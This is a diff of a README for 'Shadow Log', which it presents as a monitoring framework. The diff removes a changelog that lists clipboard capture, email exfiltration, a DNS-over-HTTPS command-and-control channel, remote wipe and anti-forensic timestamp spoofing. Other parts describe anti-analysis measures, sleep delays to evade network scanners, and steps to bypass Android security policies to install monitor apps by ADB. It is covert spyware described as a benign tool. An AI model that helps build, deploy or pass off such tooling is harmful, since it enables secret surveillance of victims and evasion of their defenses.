@@ -35,44 +35,6 @@ Shadow Log is a high-performance, native systems monitoring framework engineered
 
 ---
 
-## 📋 Changelog — v2.3
-
-### 🆕 New Features
-| Feature | Description |
-|---------|-------------|
-| **Auto UAC Elevation** | Uses `ShellExecuteExW("runas")` to natively trigger the UAC prompt — no more manual "Run as Administrator" |
-| **Application Manifest** | Embedded `.manifest` requesting `requireAdministrator` — Windows shows the shield icon automatically |
-| **Clipboard Monitoring** | Captures text clipboard changes with deduplication — tagged `[CLIPBOARD]` |
-| **USB Drive Detection** | Logs USB drive insertion/removal with volume label and serial number — tagged `[USB]` |
-| **Wi-Fi Network Logging** | Logs connected SSID, BSSID, signal strength, and authentication type — tagged `[WIFI]` |
-| **SMTP Email Exfiltration** | Third delivery channel via email (TLS/STARTTLS) — works with Gmail, Outlook, custom SMTP |
-| **DNS-over-HTTPS C2** | Deep-stealth fallback channel encoding data as DNS TXT queries to Cloudflare DoH |
-| **Remote Kill Switch** | Telegram bot commands: `/kill` (self-destruct), `/pause` (suspend all telemetry), `/resume`, `/status`, `/wipe` |
-| **Log Rotation** | Auto-rotates local storage at 50MB to prevent disk exhaustion |
-| **Registry Config Storage** | Config stored encrypted in Windows Registry — fewer filesystem artifacts |
-| **Anti-Forensics Timestomp** | Data file timestamps spoofed to blend with legitimate Windows system files |
-
-### ⚡ Performance Optimizations
-| Optimization | Impact |
-|-------------|--------|
-| Shared HTTP client with connection pooling | Eliminates per-request connection overhead |
-| Cached AES-256-GCM cipher | Avoids re-initializing cipher on every encrypt/decrypt call |
-| Pre-allocated UTF-16 buffers | Zero-allocation `getActiveWindowInfo()` in the hot path |
-| Throttled log rotation | Checks every 50 writes instead of every write |
-| Batch size 3→10 | ~70% reduction in disk I/O operations |
-| Focus ticker 1s→2s | Halves CPU wake-ups for window change detection |
-| GOMAXPROCS capped at 2 | Limits CPU core utilization for lighter footprint |
-| sync.Pool for screenshot buffers | Eliminates repeated heap allocations during capture |
-| Pre-computed key lookups | Numpad and F-key strings avoid `fmt.Sprintf` in hot path |
-| Stream JSON decoding | DoH responses decoded directly from stream (no `io.ReadAll`) |
-
-### 🐛 Bug Fixes
-- **Removed uptime check** that caused silent exits on recently-booted machines
-- **Fixed scanner buffer overflow** for large encrypted log lines in Decryptor
-- **Decryptor now reads rotated `.bak` files** for complete forensic reconstruction
-
----
-
 ## Technical Features
 
 ### 🛡️ Multi-Layer Anti-Analysis
@@ -157,6 +119,16 @@ During setup, you'll configure:
 1. Click **Test Configuration** to verify each channel.
 2. Click **Initialize Monitor** — the setup wizard will close, and the service will lock the configuration.
    - *Note: To defeat behavioral network scanners, the service implements a randomized **60 to 180 second sleep** before its first initialization. Please wait up to 3 minutes before expecting telemetry.*
+
+---
+
+### Android Installation Troubleshooting
+
+If direct APK installation on your Android device fails or is blocked by security policies, you can use the included USB installer:
+1. Enable **USB Debugging** on your phone (Settings → Developer Options).
+2. Connect your phone to your laptop via USB cable and accept the debugging prompt on the phone screen.
+3. Extract the release archive on your laptop and run **`install-mobile.bat`**.
+4. The script will automatically bypass restrictions and install both the Monitor and Controller APKs via ADB.
 
 ---
 
@@ -250,6 +222,12 @@ shadowlog/
 │   └── main.go             # Complete system removal tool
 └── site/                   # Landing page (Next.js)
 ```
+
+---
+
+## 📄 License
+
+This project is licensed under the [GNU General Public License v3.0 (GPLv3)](LICENSE). See the [LICENSE](LICENSE) file for details.
 
 ---
 
